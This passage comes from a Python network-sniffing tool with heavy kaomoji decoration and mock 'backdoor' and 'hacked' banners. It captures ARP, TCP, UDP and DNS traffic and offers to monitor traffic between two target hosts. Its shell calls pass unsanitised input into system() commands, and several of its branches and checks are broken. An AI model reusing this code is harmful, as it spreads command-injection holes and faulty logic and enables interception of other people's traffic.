                       num_of_pkts=int(input("Maam please give the number that you want to monitor the packets (✿◦’ᴗ˘◦)♡ :- "))
                       file_save_c=input("Maam do you want to save it in a file[y/n]:- ")
                       if file_save_c=='y':
                           store_num=1
                       else:
                         pass
                       arp_sniff=sniff(prn=arp_callback,filter="arp",count=num_of_pkts,store=store_num,iface=interface_val)
                       if store_num==1:
                          arp_pcap=input("Okkk Maam enter the file name please (╹◡◠) :- ")
                          arp_file=directory+arp_pcap+".pcapng"
                          with open(arp_file,"w") as arp_saver:
                               i=0
                               while i<num_of_pkts:
                                    arp_saver.write(arp_sniff[i].summary(lambda s,r: r.sprintf("%ARP.op%")=="is-at"))
                                    i+=1
                          total=50
                          bar=ProgressBar(total,prefix='¦ -===≡≡≡( ͝° ͜ʖ͡°)¦...',spinner_type='db')
                          for gen in range(total):
                              bar.iter()
                              s(0.2)
                          print("")
                          print(f"Maam your file is now :- {arp_file}")
                          system(f"dbus-launch gnome-terminal -q --command 'nano {arp_file}'")
                       else:
                          print("Okk Maam Byeee... ͡° ͜ʖ ͡ –")
                    elif analyzer_mode_value==2:
                         D.sniffer_design(sniffer_name="ＴȼＰ")
                         print("")
                         def tcp_callback(pkt):
                             if TCP in pkt and bool(pkt[TCP].sport)==True:
                                 print(pkt.sprintf("%IP.src% 乂 %TCP.sport% (ง ͠ ᵒ̌ Дᵒ̌)¤=[%TCP.flags%]:::::> %TCP.dport% 乂 %IP.dst%"))
                         
                         num_of_pkts=int(input("Maam please give the number that you want to monitor the packets (✿◦’ᴗ˘◦)♡ :- "))
                         file_save_c=input("Maam do you want to save it in a file[y/n]:- ")
                         store_num=0
                         if file_save_c=='y':
                             store_num=1
                         else:
                            pass
                         tcp_sniff=sniff(prn=tcp_callback,filter="tcp",count=num_of_pkts,store=store_num,iface=interface_val)
                         if store_num==1:
                            tcp_pcap=input("Okkk Maam enter the file name please (╹◡◠) :- ")
                            tcp_file=directory+tcp_pcap+".pcapng"
                            with open(tcp_file,"w") as tcp_saver:
                                 i=0
                                 while i<num_of_pkts:
                                       tcp_saver.write(tcp_sniff[i].summary())
                                       i+=1
                            total=50
                            bar=ProgressBar(total,prefix='¦( ͡🌀 ͜ʖ ͡🌀)つ━━━☆ﾟ.*･｡ﾟ¦...',spinner_type='db')
                            for gen in range(total):
                                bar.iter()
                                s(0.2)
                            print("")
                            print(f"Maam your file is now :- {tcp_file}")
                            system(f"dbus-launch gnome-terminal -q --command 'nano {tcp_file}'")
                         else:
                            print("Okk Maam Byeee...( ͡°_ʖ ~)")
                    else:
                        D.sniffer_design(sniffer_name="ᙀ𝔇や")    
                        print("")
                        def udp_callback(pkt):
                            if UDP in pkt and not DNS in pkt:
                                print("")
                                print(pkt.sprintf("﴾ %IP.src% ⚔ %UDP.sport%﴿  𓆩💜𓆪 𓊈𓆪Ī𓆩 ꋬꪑ 𝐀țțᵃcₖìꫛ ᶢ 𝔬ꫜ 𓊉 𓆩💜𓆪 ﴾ %UDP.dport% ⚔ %IP.dst%﴿ "))
                                print("")
                            elif UDP in pkt and DNSQR in pkt:
                                 print("")
                                 return pkt.sprintf("乂%IP.src%乂༽⎝ཌད⎠༼乂%UDP.sport%乂 ▄︻┻═┳一꧁  𓊈%DNS.qd%𓊉 ꧂   乂%UDP.dport%乂༽⎝ཌད⎠༼乂%IP.dst%乂")
                                 print("")
                        num_of_pkts=int(input("Maam please give the number that you want to monitor the packets (✿◦’ᴗ˘◦)♡ :- "))
                        file_save_c=input("Maam do you want to save it in a file[y/n]:- ")
                        store_num=0
                        if file_save_c=='y':
                             store_num=1
                        else:
                            pass
                        udp_sniff=sniff(prn=udp_callback,filter="udp",count=num_of_pkts,store=store_num,iface=interface_val)
                        if store_num==1:
                            udp_pcap=input("Okkk Maam enter the file name please (╹◡◠) :- ")
                            udp_file=directory+udp_pcap+".pcapng"
                            with open(udp_file,"w") as udp_saver:
                                 i=0
                                 while i<num_of_pkts:
                                       udp_saver.write(udp_sniff[i].summary())
                                       i+=1
                            total=50
                            bar=ProgressBar(total,prefix='¦(҂`з´).っ︻デ═一¦...',spinner_type='db')
                            for gen in range(total):
                                bar.iter()
                                s(0.2)
                            print("")
                            print(f"Maam your file is now :- {udp_file}")
                            system(f"dbus-launch gnome-terminal -q --command 'nano {udp_file}'")
                        else:
                            print("Okk Maam Byeee...😉")
                 elif snif_mode==3:
                      D.tcpdump_design()
                      print("")
                      print("In this attack you can monitor the communications between two hosts...┏(-_-)┛┗(-_- )┓")
                      host1=input("Maam Please enter the 1st host/ip ♨(⋆‿⋆)♨:- ")
                      host2=input("Now Enter the 2nd host/ip 😎:- ")
                      name_interface=input("Maaam Please enter your interface name 🛜:- ")
                      counts=input("Maam Please set the number of packets that you wanna sniff (✿˶’◡˘)♡:- ")
                      tcpdump_save=input("Do you want to save it in a file then type filename only if not then blank it ಠ ‿↼ :- ")
                      if bool(tcpdump_save)==True:
                         tcpdump_save_file=directory+tcpdump_save+".json"
                         tcpdump_json=json.load(tcpdump(args=["-i",f"{name_interface}","-c",f"{counts}","-T","json"],flt=f"host {host1} and host {host2}",prog=conf.prog.tshark,getfd=True))
                         pprint.pprint(tcpdump_json)
                         tcpdump_json_file=json.dumps(tcpdump_json,indent=4)
                         with open(tcpdump_save_file,"w") as tcpdump_file:
                              tcpdump_file.write(tcpdump_json_file)
                         with Progress() as process:
                              x=process.add_task("....",total=100)
                              for p in range(100):
                                  process.update(x,advance=1)
                                  s(0.2)
                         print(f"Your File with this Name :- {tcpdump_save_file}")
                         system(f"read -p 'Maam enter your login username:-' name;sudo -u $name dbus-launch gnome-terminal -q --command 'firefox {tcpdump_save_file}'")
                      else:
                         tcpdump(quiet=True,args=["-i",f"{name_interface}","-c",f"{counts}"],flt=f"host {host1} and host {host2}")
                      print("Baa Byee Maaam...( ͡~ ͜ʖ ͡° )") 
                 elif snif_mode==1:
                    shark_text="""      
            ⠰⣶⣶⣿⣷⣶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⠉⣉⣉⣉⣉⣉⣛⣛⡻⠿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣿⠟⠋⢁⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠋⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠋⣀⣴⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⢀⣴⣿⣿⣿⣿⠏⣼⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣤⣈⣙⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⣻⣿⣿⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠃⢠⣿⣿⣿⣿⣿⡏⠀⢻⣿⣿⠘⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣥⣤⣤⣴⣾⣿⠟⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⠃⢀⣿⣿⣿⣿⣿⣿⣧⡀⠈⠻⣿⣦⠈⠻⠄⢹⣿⣿⣿⡿⠟⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣽⣿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⠀⠀⠀⢀⣴⠾⠛⠉⠁⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⢸⣿⣦⣶⣰⣧⣠⣦⠀⣴⣆⢀⣦⣀⣴⣄⣴⣿⣿⣿⣿⣶⣶⣤⣄⡀⠀
⠀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠓
⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠋⠉⠀⠀⣀⣠⣤⣶⡶⠶⠶⠶⠶⠶⢶⣶⣦⣤⣄⣙⠀⠘⠟⠙⢿⡿⢻⣿⡿⣿⡿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⢿⣷⣶⣤⣀⡀⠀⠉⠀⠈⣁⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⠿⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣤⡘⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠛⢧⠈⠁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠁⠀⠈⠀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⣈⡙⠻⠿⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠘⠻⢷⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⢨⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⢸⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠀⢸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⣸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀ ⢻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    """
                    print(colored(shark_text,"blue",attrs=['bold']))
                    print("")
                    D.shark_table()
                    shark_mode=input("Maam Choose the Shark Mode ヽ༼◥▶ ل͜◀◤༽ﾉ :- ")
                    if shark_mode=='1':
                        D.tshark_design()
                        print("")
                        print("You can choose a particular ip or host and sniff a particular port even protocol also...(☞⌐▀͡ ͜ʖ͡▀ )☞")
                        ip1=input("Maaam give the target ip (>‿♥):- ")
                        port_check=input("You can also give the port number ~(≧ω≦)~:- ")
                        num_of_pkts=int(input("Enter the number that to capture the packets (￣个￣):- "))
                        protocol_name=input("Even you have to give the protocol name ✌.|•͡˘‿•͡˘|.✌:- ")
                        name_interface=input("Maam do you want to provide interface name if yes just type that if not just leave it (＊๑˘◡˘):- ")
                        tshark_save=input("Do you want to save it in a file[y/n]:- ")
                        if bool(name_interface)==True or tshark_save=='y':
                            tshark_file_name=input("Maam Please enter the file name ♡´･ᴗ･`♡ :- ")
                            tshark_file=directory+tshark_file_name+".pcap"
                            if bool(name_interface)==True:
                                system(f"tshark -c {num_of_pkts} -i {name_interface} host {ip1} and port {port_check} and {protocol_name} >> {tshark_file}")
                            else:
                                system(f"tshark -c {num_of_pkts} host {ip1} and port {port_check} and {protocol_name} >> {tshark_file}")
                            bar=progressbar.ProgressBar(maxval=50,widgets=[' ༺ ',"Ęꫜț𝘦ŕﺂꫜᧁ ᵞσ𝚞ŕ ᶠﺂꙆė...",progressbar.AnimatedMarker(),'༻ ',progressbar.Bar(marker="#",left=' [',right=']'),' (',progressbar.ETA(),') ']).start()
                            for i in range(50):
                                bar.update(i)
                                s(0.1)
                            print("")
                            print(f"Maam your File is:- {tshark_file}")
                            system(f"dbus-launch gnome-terminal -q --command 'nano {tshark_file}'")
                        else:
                           tshark(filter=f"host {ip1} and port {port_check} and {protocol_name}",count=num_of_pkts) 
                        print("Seee you Again...🫣")
                    else:
                        D.wireshark_design()
                        print("")
                        print("In this Attack you can custom your sniffing attack like choose only single host part or communication between two hosts and custom protocol also...┗( ＾0＾)┓")
                        ip_host1=input("Maam you can give the host1 if you want ╰ (´꒳`) ╯ :- ")
                        ip_host2=input("Maam you can also give the host2 if you want ( ♥ ͜ʖ ♥) :- ")
                        proto_col=input("If you want that i want to check a particular protocol you can give or leave it ⊂（♡⌂♡）⊃ :- ")
                        num_of_pkts=int(input("Maam Enter the number that you want to capture packets ( ◥◣_◢◤ ) :- "))
                        def protocols_fun(pkt):
                            if TCP in pkt:
                                print(pkt)
                            elif UDP in pkt:
                                 print(pkt)
                            elif DNS in pkt:
                                 print(pkt)
                            elif IP in pkt:
                                 print(pkt)
                            else:
                                return pkt
                        if bool(ip_host1)==True:
                           wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host1}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(ip_host1)==True and bool(ip_host2)==True:
                             wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host1} and host {ip_host2}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(ip_host1)==True and bool(proto_col)==True:
                             wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host1} and {proto_col}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(ip_host1)==True and bool(ip_host2)==True and bool(proto_col)==True:
                             wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host1} and host {ip_host2} and {proto_col}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(proto_col)==True:
                            wireshark(sniff(prn=protocols_fun,filter=f"{proto_col}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(ip_host2)==True:
                             wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host2}",count=num_of_pkts,quiet=True,iface=interface_val))
                        elif bool(ip_host2)==True and bool(proto_col)==True:
                             wireshark(sniff(prn=protocols_fun,filter=f"host {ip_host2} and {proto_col}",count=num_of_pkts,quiet=True,iface=interface_val))
                        else:
                           wireshark(sniff(prn=protocols_fun,count=num_of_pkts,quiet=True,iface=interface_val))
                        exit()
        else: 
            print("Hope We will Meet again Miss Hacker...😘")
            exit()       
    D.usage()
    value=int(input("Maam, Will you plz  take the number:- "))
    if value==1 or layer_num==2 and layer_num==3:
       ip_first=input("Okk!!! Now Please take an ip's 3 bytes only ex:- 192.168.0 now it's your turn Maam:- ")
       ip_firstrange=int(input("Now Take the 1st range of ip:- "))
       ip_lastrange=int(input("Take the 2nd range of ip:- "))
    elif layer_num==2 or layer_num==3:
        pass    
    num_of_layer=layer_num
    given_value(value,num_of_layer)
    main()
if get_uid==1000:
    print("Maam Please Run it as Root...☆(☢‿☢)☆")
else:
  with Pre_theme(colored("System is Checking your Virus","green",attrs=['bold'])):
       for i in range(10):
           s(0.25)
  hack_text="""
▓██   ██▓ ▒█████   █    ██     ██░ ██  ▄▄▄    ██▒   █▓▓█████     ▄▄▄▄   ▓█████ ▓█████  ███▄    █     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄  ▐██▌
 ▒██  ██▒▒██▒  ██▒ ██  ▓██▒   ▓██░ ██▒▒████▄ ▓██░   █▒▓█   ▀    ▓█████▄ ▓█   ▀ ▓█   ▀  ██ ▀█   █    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌ ▐██▌
  ▒██ ██░▒██░  ██▒▓██  ▒██░   ▒██▀▀██░▒██  ▀█▄▓██  █▒░▒███      ▒██▒ ▄██▒███   ▒███   ▓██  ▀█ ██▒   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌ ▐██▌
  ░ ▐██▓░▒██   ██░▓▓█  ░██░   ░▓█ ░██ ░██▄▄▄▄██▒██ █░░▒▓█  ▄    ▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ ▓██▒  ▐▌██▒   ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌ ▓██▒
  ░ ██▒▓░░ ████▓▒░▒▒█████▓    ░▓█▒░██▓ ▓█   ▓██▒▒▀█░  ░▒████▒   ░▓█  ▀█▓░▒████▒░▒████▒▒██░   ▓██░   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓  ▒▄▄ 
   ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▐░  ░░ ▒░ ░   ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░░ ▒░   ▒ ▒     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒▒▓  ▒  ░▀▀▒
 ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░     ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ░  ░   ▒░▒   ░  ░ ░  ░ ░ ░  ░░ ░░   ░ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒  ░  ░
 ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░     ░  ░░ ░  ░   ▒     ░░     ░       ░    ░    ░      ░      ░   ░ ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░    ░ ░  ░     ░
 ░ ░         ░ ░     ░         ░  ░  ░      ░  ░   ░     ░  ░    ░         ░  ░   ░  ░         ░     ░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░     ░   
 ░ ░                                              ░                   ░                                               ░                       ░           
  """
  pre_style = Pre_theme(colored("Entering into Your Backdoor System...",'red',attrs=['bold']), colored(hack_text,'red',attrs=['bold','blink']), 0.05).start()
  for i in range(10):
      s(0.25)  
  pre_style.stop()
  s(5)
  system('clear')
  D=Design()
  print("")
  show_interfaces()
  recomendation_text="""
 _____                                                                                                                                                                   _____
( ___ )-----------------------------------------------------------------------------------------------------------------------------------------------------------------( ___ )
 |   |                                                                                                                                                                   |   |
 |   |  ______      _____     ____     ____       __    __       __    __      _____      __      _   ______       ____     ________    _____     ____        __      _  |   |
 |   | (   __ \    / ___/    / ___)   / __ \      \ \  / /       \ \  / /     / ___/     /  \    / ) (_  __ \     (    )   (___  ___)  (_   _)   / __ \      /  \    / ) |   |
 |   |  ) (__) )  ( (__     / /      / /  \ \     () \/ ()       () \/ ()    ( (__      / /\ \  / /    ) ) \ \    / /\ \       ) )       | |    / /  \ \    / /\ \  / /  |   |
 |   | (    __/    ) __)   ( (      ( ()  () )    / _  _ \       / _  _ \     ) __)     ) ) ) ) ) )   ( (   ) )  ( (__) )     ( (        | |   ( ()  () )   ) ) ) ) ) )  |   |
 |   |  ) \ \  _  ( (      ( (      ( ()  () )   / / \/ \ \     / / \/ \ \   ( (       ( ( ( ( ( (     ) )  ) )   )    (       ) )       | |   ( ()  () )  ( ( ( ( ( (   |   |
 |   | ( ( \ \_))  \ \___   \ \___   \ \__/ /   /_/      \_\   /_/      \_\   \ \___   / /  \ \/ /    / /__/ /   /  /\  \     ( (       _| |__  \ \__/ /   / /  \ \/ /   |   |
 |   |  )_) \__/    \____\   \____)   \____/   (/          \) (/          \)   \____\ (_/    \__/    (______/   /__(  )__\    /__\     /_____(   \____/   (_/    \__/    |   |
 |   |                                                                                                                                                                   |   |
 |   |               Maam 1st you need to know that in which layer you want to send the packets like layer-2(Data-link Layer) or layer-3(Network Layer)                  |   |
 |   |                   you can also choose the layer number by pressing 2 or 3 but for that case must have two interfaces like Ethernet and WiFi                       |   |
 |   |             if you are running on vmware or VirtualBox then please select the layer-2 and if you use WireShark then have to choose Ethernet interfaces            |   |
 |   |         But if you have any kind of external wifi adapter and you have selected it on VMware then you can send packets in layer-2 or layer-3 as your wish         |   |
 |   |               Suppose your default os is in Wifi mode but not connected to an ethernet cable on that time you will have to choose the layer-3 even                |   |
 |___|                                                          if you use WireShark choose WiFi interfaces                                                              |___|
(_____)-----------------------------------------------------------------------------------------------------------------------------------------------------------------(_____)
"""
  print(colored(recomendation_text,"green",attrs=['bold']))
  interface_avl=get_if_list()
  if len(interface_avl)==2:
        match_char='lo'
        i=0
        while i<len(interface_avl):
             if match_char==interface_avl[i]:
                if i==1:
                    if 'e' in interface_avl[i-1]:
                        interface=interface_avl[i-1]
                        my_ip=get_if_addr(interface)
                        interface_val=interface
                        layer_num=2 
                    elif 'w' in interface_avl[i-1]:
                         interface=interface_avl[i-1]
                         my_ip=get_if_addr(interface)
                         interface_val=interface
                         layer_num=3
                else:
                  if 'e' in interface_avl[i+1]:
                        interface=interface_avl[i+1]
                        my_ip=get_if_addr(interface)
                        interface_val=interface
                        layer_num=2 
                  elif 'w' in interface_avl[i+1]:
                         interface=interface_avl[i+1]
                         my_ip=get_if_addr(interface)
                         interface_val=interface
                         layer_num=3
             i+=1
  else:
    layer_num=int(input("So Select the number maam 2 or 3 ( ๑‾̀◡‾́)σ :- "))
    if layer_num==2:
       print(f"Ouk Maam You've choosen layer-{layer_num} so if you want to capture the packet from WireShark have to use Ethernet Interface...꒰ღ˘‿˘ற꒱❤⃛")
    else:
      print(f"Ouk Maam You've choosen layer-{layer_num} so if you want to capture the packet from WireShark have to use Wifi Interface...(˵¯͒〰¯͒˵)")
    layer_network=[]
    layer_datalink=[]
